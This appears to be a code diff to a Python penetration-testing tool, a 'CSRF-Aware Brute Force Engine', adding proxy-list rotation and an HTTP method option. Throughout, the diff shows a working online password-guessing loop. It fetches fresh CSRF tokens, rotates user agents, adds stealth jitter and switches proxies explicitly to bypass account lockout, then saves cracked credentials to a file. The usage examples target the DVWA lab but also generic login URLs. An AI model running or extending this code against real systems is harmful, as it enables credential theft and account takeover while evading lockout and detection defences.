@@ -660,22 +738,39 @@ def run_attack(
     
     # ---- STEP 1: Session Initialization ----
     print(f"  {C.GREEN}▶{C.RST} Initializing session...\n")
-    session = init_session(login_url, proxy=proxy, verbose=verbose)
-    print()
     
+    # Determine initial proxy
+    if proxy_pool and proxy_pool.is_active:
+        session = init_session(
+            login_url, proxy_dict=proxy_pool.get_proxy_dict(), verbose=verbose
+        )
+    else:
+        session = init_session(login_url, proxy=proxy, verbose=verbose)
+    
+    print()
     cracked_password = None
     
-    # ---- STEP 7: Main Loop ----
     try:
         for attempt, password in enumerate(passwords, 1):
-            # Check interrupt flag (set by Ctrl+C handler)
             if _interrupted:
                 break
             
             attempt_start = time.time()
+            current_proxy_addr = proxy_pool.current if proxy_pool and proxy_pool.is_active else None
             
             try:
-                # STEP 2+3: Fetch fresh CSRF token (AUTOMATED & DYNAMIC)
+                # If using proxy pool, apply current proxy to session
+                if proxy_pool and proxy_pool.is_active:
+                    pd = proxy_pool.get_proxy_dict()
+                    if pd:
+                        session.proxies = pd
+                        session.verify = False
+                    else:
+                        # All proxies dead, fall back to direct
+                        session.proxies = {}
+                        print(f"  {C.BYELLOW}[!]{C.RST} All proxies dead, falling back to direct connection")
+                
+                # STEP 2+3: Fresh CSRF token
                 csrf_token = fetch_csrf_token(
                     session, login_url,
                     token_name=token_name, verbose=verbose
@@ -683,10 +778,8 @@ def run_attack(
                 
                 # STEP 4: Build payload
                 payload = build_payload(
-                    username=username,
-                    password=password,
-                    csrf_token=csrf_token,
-                    token_name=token_name
+                    username=username, password=password,
+                    csrf_token=csrf_token, token_name=token_name
                 )
                 
                 if verbose:
@@ -695,15 +788,16 @@ def run_attack(
                         f"Params: {list(payload.keys())}"
                     )
                 
-                # STEP 5: Execute with evasion
+                # STEP 5: Execute
                 response = execute_attempt(
                     session, login_url, payload,
+                    method=method,
                     jitter_range=jitter_range,
                     rotate_ua=rotate_ua,
                     verbose=verbose
                 )
                 
-                # STEP 6: Response analysis
+                # STEP 6: Analyze
                 success = analyze_response(
                     response,
                     failure_string=failure_string,
@@ -713,29 +807,22 @@ def run_attack(
                 
                 elapsed_ms = (time.time() - attempt_start) * 1000
                 
-                # Record in cache
+                # Cache result
                 _results_cache.record_attempt(
-                    password=password,
-                    success=success,
-                    status_code=response.status_code,
-                    elapsed_ms=elapsed_ms
+                    password=password, success=success,
+                    status_code=response.status_code, elapsed_ms=elapsed_ms
                 )
                 
-                # Print colorized result
+                # Colorized output
                 print_attempt(
-                    attempt_num=attempt,
-                    total=total,
-                    username=username,
-                    password=password,
-                    success=success,
-                    status_code=response.status_code,
-                    verbose=verbose
+                    attempt_num=attempt, total=total,
+                    username=username, password=password,
+                    success=success, status_code=response.status_code,
+                    proxy_addr=current_proxy_addr
                 )
                 
                 if success:
                     cracked_password = password
-                    
-                    # Write to output file
                     if output_file:
                         elapsed = (datetime.now() - _results_cache.start_time).total_seconds()
                         with open(output_file, "a") as f:
@@ -744,17 +831,27 @@ def run_attack(
                                 f"{username}:{password} "
                                 f"({attempt} attempts, {elapsed:.1f}s)\n"
                             )
-                    
-                    # ═══ BREAK THE LOOP — credential found ═══
-                    break
+                    break  # ═══ LOOP BREAK — credential found ═══
                 
-                # STEP 7 (Reset): Discard consumed token
+                # STEP 7: Discard consumed token + proxy rotation
                 del csrf_token
+                if proxy_pool and proxy_pool.is_active:
+                    proxy_pool.mark_used()
+                    # If proxy rotated, reinitialize session for new IP
+                    if proxy_pool.current != current_proxy_addr:
+                        if verbose:
+                            print(
+                                f"  {C.BMAGENTA}[PROXY]{C.RST} Rotating → "
+                                f"{C.CYAN}{proxy_pool.current}{C.RST}"
+                            )
+                        session = init_session(
+                            login_url,
+                            proxy_dict=proxy_pool.get_proxy_dict(),
+                            verbose=verbose
+                        )
+                
                 if verbose:
-                    print(
-                        f"  {C.DIM}[STEP 7] Token invalidated → "
-                        f"returning to Step 2{C.RST}"
-                    )
+                    print(f"  {C.DIM}[STEP 7] Token invalidated → Step 2{C.RST}")
             
             except KeyboardInterrupt:
                 break
@@ -767,8 +864,16 @@ def run_attack(
                 )
                 if verbose:
                     print(f"  {C.YELLOW}[!]{C.RST} Token error: {e}")
-                    print(f"      Retrying with fresh session...")
-                session = init_session(login_url, proxy=proxy, verbose=verbose)
+                # Re-init session
+                if proxy_pool and proxy_pool.is_active:
+                    proxy_pool.mark_dead()
+                    session = init_session(
+                        login_url,
+                        proxy_dict=proxy_pool.get_proxy_dict(),
+                        verbose=verbose
+                    )
+                else:
+                    session = init_session(login_url, proxy=proxy, verbose=verbose)
                 continue
             
             except requests.RequestException as e:
@@ -779,133 +884,118 @@ def run_attack(
                 )
                 if verbose:
                     print(f"  {C.YELLOW}[!]{C.RST} Network error: {e}")
-                    print(f"      Backing off 5s...")
-                time.sleep(5)
+                # Proxy might be dead
+                if proxy_pool and proxy_pool.is_active:
+                    proxy_pool.mark_dead()
+                    if proxy_pool.alive_count > 0:
+                        print(
+                            f"  {C.BMAGENTA}[PROXY]{C.RST} Dead proxy removed, "
+                            f"{proxy_pool.alive_count} remaining"
+                        )
+                        session = init_session(
+                            login_url,
+                            proxy_dict=proxy_pool.get_proxy_dict(),
+                            verbose=verbose
+                        )
+                    else:
+                        print(f"  {C.BRED}[!]{C.RST} All proxies exhausted")
+                else:
+                    time.sleep(5)
                 continue
     
     except KeyboardInterrupt:
         pass
     
-    # ═══════════════════════════════════════════════════════════════
-    # ALWAYS print summary on exit — success, Ctrl+C, or exhaustion
-    # ═══════════════════════════════════════════════════════════════
+    # ═══ ALWAYS print summary ═══
     _results_cache.print_summary()
-    
-    # Restore original signal handler
     signal.signal(signal.SIGINT, original_handler)
-    
     return cracked_password
 
 
 # ============================================================================
-# CLI Interface
+# CLI
 # ============================================================================
 
 def parse_args() -> argparse.Namespace:
-    """Parse command-line arguments."""
     parser = argparse.ArgumentParser(
-        description="CSRF-Aware Brute Force Engine v2.0 for Penetration Testing",
+        description="CSRF-Aware Brute Force Engine v2.1",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
-  # DVWA brute (high-security with CSRF)
-  python3 csrf_brute.py -t http://192.168.1.100/vulnerabilities/brute/ -u admin -w passwords.txt
+  # DVWA brute force page (uses GET method)
+  python3 csrf_brute.py -t http://192.168.1.100/vulnerabilities/brute/ -u admin -w wordlists/sample.txt
 
-  # DVWA main login page
-  python3 csrf_brute.py -t http://192.168.1.100/login.php -u admin -w passwords.txt
+  # DVWA main login page (uses POST method)
+  python3 csrf_brute.py -t http://192.168.1.100/login.php -u admin -w wordlists/sample.txt -m POST
 
-  # Custom app with different token name
-  python3 csrf_brute.py -t http://target.local/auth/login -u admin -w rockyou.txt \\
+  # Impossible mode — proxy rotation to bypass lockout
+  python3 csrf_brute.py -t http://192.168.1.100/vulnerabilities/brute/ -u admin -w wordlists/sample.txt \\
+      --proxy-list proxies.txt --lockout-after 2
+
+  # Custom app
+  python3 csrf_brute.py -t http://target.local/auth/login -u admin -w rockyou.txt -m POST \\
       --token-name csrf_token --failure "Invalid credentials"
 
-  # With Burp Suite proxy + verbose
-  python3 csrf_brute.py -t http://192.168.1.100/vulnerabilities/brute/ -u admin -w passwords.txt \\
+  # With Burp Suite proxy
+  python3 csrf_brute.py -t http://192.168.1.100/vulnerabilities/brute/ -u admin -w wordlists/sample.txt \\
       --proxy http://127.0.0.1:8080 -v
 
   # Maximum stealth
-  python3 csrf_brute.py -t http://target/login -u admin -w passwords.txt \\
+  python3 csrf_brute.py -t http://target/login -u admin -w wordlists/sample.txt \\
       --jitter-min 3.0 --jitter-max 10.0
         """
     )
 
-    parser.add_argument(
-        "-t", "--target",
-        required=True,
-        help="Full target URL to attack (e.g., http://192.168.1.100/vulnerabilities/brute/)"
-    )
-    parser.add_argument(
-        "-u", "--username",
-        required=True,
-        help="Target username to brute-force"
-    )
-    parser.add_argument(
-        "-w", "--wordlist",
-        required=True,
-        help="Path to password wordlist file"
-    )
-    parser.add_argument(
-        "--token-name",
-        default="user_token",
-        help="CSRF token parameter name (default: user_token)"
-    )
-    parser.add_argument(
-        "--failure",
-        default="Login failed",
-        help='Failure string in response body (default: "Login failed")'
-    )
-    parser.add_argument(
-        "--success-path",
-        default="/dashboard",
-        help="Redirect path indicating success (default: /dashboard)"
-    )
-    parser.add_argument(
-        "--jitter-min",
-        type=float,
-        default=0.5,
-        help="Minimum jitter delay in seconds (default: 0.5)"
-    )
-    parser.add_argument(
-        "--jitter-max",
-        type=float,
-        default=2.0,
-        help="Maximum jitter delay in seconds (default: 2.0)"
-    )
-    parser.add_argument(
-        "--no-ua-rotate",
-        action="store_true",
-        help="Disable User-Agent rotation"
-    )
-    parser.add_argument(
-        "--proxy",
-        help="HTTP proxy (e.g., http://127.0.0.1:8080 for Burp Suite)"
-    )
-    parser.add_argument(
-        "-o", "--output",
-        help="Output file to append cracked credentials"
-    )
-    parser.add_argument(
-        "-v", "--verbose",
-        action="store_true",
-        help="Enable verbose/debug output (show all STEP details)"
-    )
+    parser.add_argument("-t", "--target", required=True,
+        help="Full target URL (e.g., http://192.168.1.100/vulnerabilities/brute/)")
+    parser.add_argument("-u", "--username", required=True,
+        help="Target username")
+    parser.add_argument("-w", "--wordlist", required=True,
+        help="Path to password wordlist")
+    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"],
+        help="HTTP method: GET (DVWA brute) or POST (login.php) — default: GET")
+    parser.add_argument("--token-name", default="user_token",
+        help="CSRF token field name (default: user_token)")
+    parser.add_argument("--failure", default="Username and/or password incorrect",
+        help='Failure string (default: "Username and/or password incorrect")')
+    parser.add_argument("--success-path", default="/dashboard",
+        help="Success redirect path (default: /dashboard)")
+    parser.add_argument("--jitter-min", type=float, default=0.5,
+        help="Min jitter delay seconds (default: 0.5)")
+    parser.add_argument("--jitter-max", type=float, default=2.0,
+        help="Max jitter delay seconds (default: 2.0)")
+    parser.add_argument("--no-ua-rotate", action="store_true",
+        help="Disable User-Agent rotation")
+    parser.add_argument("--proxy",
+        help="Single HTTP proxy (e.g., http://127.0.0.1:8080)")
+    parser.add_argument("--proxy-list",
+        help="Proxy list file for rotation (one per line, for lockout bypass)")
+    parser.add_argument("--lockout-after", type=int, default=2,
+        help="Rotate proxy after N attempts (default: 2)")
+    parser.add_argument("-o", "--output",
+        help="Output file for cracked credentials")
+    parser.add_argument("-v", "--verbose", action="store_true",
+        help="Show all step-level debug output")
 
     return parser.parse_args()
 
 
 def main():
-    """Entry point."""
     args = parse_args()
 
     result = run_attack(
         target_url=args.target,
         username=args.username,
         wordlist_path=args.wordlist,
+        method=args.method,
         token_name=args.token_name,
         failure_string=args.failure,
         success_path=args.success_path,
         jitter_range=(args.jitter_min, args.jitter_max),
         rotate_ua=not args.no_ua_rotate,
         proxy=args.proxy,
+        proxy_file=args.proxy_list,
+        lockout_threshold=args.lockout_after,
         verbose=args.verbose,
         output_file=args.output,
     )
